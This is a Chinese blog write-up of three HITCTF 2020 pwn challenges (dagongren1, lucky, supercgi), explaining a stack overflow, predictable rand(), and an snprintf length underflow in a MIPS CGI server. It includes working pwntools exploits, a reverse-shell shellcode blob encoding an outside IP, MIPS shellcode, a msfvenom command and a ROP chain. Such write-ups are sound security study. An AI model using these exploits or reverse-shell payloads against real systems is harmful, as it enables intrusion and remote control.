---
title: HITCTF 2020 三道 Pwn
date: 2020-12-09 00:00:02
categories:
- CTF/Pwn
tags: HITCTF mips
---

> 比较简单的Pwn，其中的MIPS Pwn是人生中拿到的第一个Pwn的一血，全是4哥的功劳。

总共五道题，做出来三道，题目全在这了：[pwn.zip](https://xuanxuanblingbling.github.io/assets/attachment/hitctf/pwn.zip)

## dagongren1

媳妇博客：[hitctf2020之dagognren1](https://blingblingxuanxuan.github.io/hitctf2020-dagongren1.html)

- 漏洞：main函数scanf栈溢出
- 利用：栈迁移+shellcode反弹shell

> shellcode: [http://shell-storm.org/shellcode/files/shellcode-857.php](http://shell-storm.org/shellcode/files/shellcode-857.php)

```python
from pwn import *
context(arch="amd64",os='linux')
#myelf = ELF("./dagongren1")
#io = process(myelf.path)
io = remote("81.70.209.171",51601)

shellcode  = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
shellcode += "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
shellcode += "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
shellcode += "\x02\x7a\x69\xc7\x44\x24\x04\x95\x81\x23\x3d\x48\x89\xe6\x6a\x10"
shellcode += "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
shellcode += "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
shellcode += "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
shellcode += "\x5f\x6a\x3b\x58\x0f\x05"

io.recv()
#gdb.attach(io,"b * 0x400736")
io.sendline('a'*32+p64(0x600e40)+p64(0x4006fc))
sleep(1)
io.sendline('a'*32+p64(0x0)+p64(0x600e50)+shellcode)
io.interactive()
```

参考其他wp：

- [HITCTF_WP_pwn4_5](https://c0yo7e.github.io/2020/12/12/HITCTFF-WP-pwn4n4-5/)
- [emocat/writeups: HITCTF-2020](https://github.com/emocat/writeups/tree/master/2020/HITCTF-2020)

发现因为只关闭了标准输出和标准错误，所以还可以使用将输出重定向到标准错位来绕过。不过使用这种方法在pwntools中用process启动就会给EOF，用socat可以成功：

```python
➜  socat tcp-l:1111,reuseaddr,fork exec:"./dagongren1"
```

```python
from pwn import *
context(arch="amd64",os='linux',log_level='debug')
io = remote("10.10.10.139",1111)
io.recv()
io.sendline('a'*32+p64(0x600e40)+p64(0x4006fc));sleep(0.1)
io.sendline('a'*32+p64(0x0)+p64(0x600e50)+asm(shellcraft.sh()))
io.sendline("exec /bin/sh 1>&0")
#io.sendline("cat /flag>&0")
io.interactive()
```

还可以使用pwntools中的 [shellcraft.cat(filename, fd=0)](http://docs.pwntools.com/en/stable/shellcraft/amd64.html?highlight=shellcraft#pwnlib.shellcraft.amd64.linux.cat)，指定fd为0即可：

```python
from pwn import *
context(arch="amd64",os='linux',log_level='debug')
io = remote("10.10.10.139",1111)
io.recv()
io.sendline('a'*32+p64(0x600e40)+p64(0x4006fc));sleep(0.1)
io.sendline('a'*32+p64(0x0)+p64(0x600e50)+asm(shellcraft.cat("/flag",0)))
io.interactive()
```

## lucky

- 漏洞：可预测的随机数
- 利用：本地预测随机数

```python
from pwn import *
from ctypes import *
context.log_level = "debug"
 
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0)/0xA+1)
myelf = ELF("./lucky")
#io = process(myelf.path)
io = remote("81.70.209.171",51700)
io.recv()
io.sendline("xuan")
for i in range(100):
    io.recv()
    io.sendline(str(libc.rand()))
io.interactive()
```

## supercgi

> 参考：[emocat/writeups: HITCTF-2020](https://github.com/emocat/writeups/tree/master/2020/HITCTF-2020)

程序属性：`mipsel32:static`，保护全关。功能是一个以标准输入输出为接口的Web服务器，所以可以使用socat这种工具将其绑定到一个端口上然后使用浏览器进行访问。路径解析处过滤了`..`后直接读文件了，中间没有什么多余的操作，所以目录穿越这种Web洞是没有了，还是关注内存问题。

- 漏洞：`detect_robot`函数中，处理多个`User-Agent`字段可导致计算长度的整数溢出，进而可以触发栈溢出
- 利用：恶意数据会存在全局变量中，地址已知，故return 2 shellcode

### 漏洞分析

漏洞函数如下：

```c
char v5[260]; // [sp+20h] [+20h] BYREF
v3 = 255;
v4 = 0;
do
{
if ( !fgets(buf, 1024, stdin) || !strcoll(buf, "\n") || !strcoll(buf, "\r\n") )
    break;
v0 = strlen(UA);
if ( !strncmp(buf, UA, v0) )
{
    v1 = strlen(UA);
    v4 = snprintf(&v5[v4], v3, "%s", &buf[v1 + 1]);
    v3 -= v4;
}
}
while ( v3 );
```

这个循环是每次读输入的一行，问题重点在snprintf上：

> man手册：[https://man7.org/linux/man-pages/man3/snprintf.3.html](https://man7.org/linux/man-pages/man3/snprintf.3.html)

```
int snprintf(char *str, size_t size, const char *format, ...);

RETURN VALUE         top
       Upon successful return, these functions return the number of
       characters printed (excluding the null byte used to end output to
       strings).

       The functions snprintf() and vsnprintf() do not write more than
       size bytes (including the terminating null byte ('\0')).  If the
       output was truncated due to this limit, then the return value is
       the number of characters (excluding the terminating null byte)
       which would have been written to the final string if enough space
       had been available.  Thus, a return value of size or more means
       that the output was truncated.  (See also below under NOTES.)

       If an output error is encountered, a negative value is returned.
```

- 首先snprintf的第二个参数类型是`size_t`，这个再往后找定义是无符号数。
- 其次snprintf的返回值是想要写入的字符串长度，而不是成功长度，故可能出现返回值大于size的情景

所以这题如果上来就给一个长度大于0xff的UA，v3一回合就变负数，下一回合就会被当成无符号数去做输入的size，就可以溢出了。即使输入的UA的长度小于0xff，因为v3是每回合都减小，所以多个回合后一样能把v3减成负数，然后溢出。

### 漏洞利用

mips的shellcode可由msf生成：

```bash
➜  msfvenom -p linux/mipsle/exec  CMD=/bin/sh  --arch mipsle --platform linux -f py -o shellcode.py
```

当然也可以使用网上其他的，如 [http://shell-storm.org/shellcode/files/shellcode-79.php](http://shell-storm.org/shellcode/files/shellcode-79.php)，最终exp如下：

```python
from pwn import *
context(arch='mips',os='linux',endian='little',log_level='debug')

myelf = ELF("./SuperCgi")
io = process(["qemu-mipsel",myelf.path])
#io = process(["qemu-mipsel","-g","1234",myelf.path])

shellcode  = b"\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"
shellcode += b"\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"
shellcode += b"\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"
shellcode += b"\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"

payload = '''GET /index.html HTTP/1.1
User-Agent: %s
User-Agent: %s
'''% ('a'*0xff,'a'*0xc+p32(0x412e6c)+shellcode)

io.sendline(payload)
io.interactive()
```

gdb调试脚本如下：

```c
➜  cat gdb.cmd 
file SuperCgi
set architecture mips
set endian little
b * 0x00400640
target remote :1234
➜  gdb-multiarch -x ./gdb.cmd
```

比赛时这个洞是瞎发包测出来的，循环那块当时没太看明白，因为溢出点是snprintf，所以payload也会00截断，开始做的非常麻烦，一个是用ROP，因为可以多次溢出，所以先溢出长的，然后溢出短的，就可以绕过00。并且利用思路也麻烦，用的ROP调用程序函数打印flag，本地成功，远程失败，本地挂socat失败，原因不详，后来询问出题人，发现预期解是执行了`cat flag`，果断用shellcode。这个麻烦的方法如下（偏移全是调出来的）：

```python
from pwn import *
myelf = ELF("./SuperCgi")
io = process(["qemu-mipsel",myelf.path])

ra = 0x0040075C # jal  catfile
s0 = 0x00412f1b # str /flag offset
pc = 0x004078F8 # move $a0, $s0; jr  $ra

payload =  "GET /index.html HTTP/1.1"
payload += "\nUser-Agent: "+('a'*167)
payload += "\nUser-Agent: "+('b'*152)   
payload += "\nUser-Agent: "+('c'*187+ p32(ra)+'/flag\x00') 
payload += "\nUser-Agent: "+('d'*78 + p32(pc))           
payload += "\nUser-Agent: "+('e'*179+ p32(s0))            
payload += "\n"

io.sendline(payload)
io.interactive()
```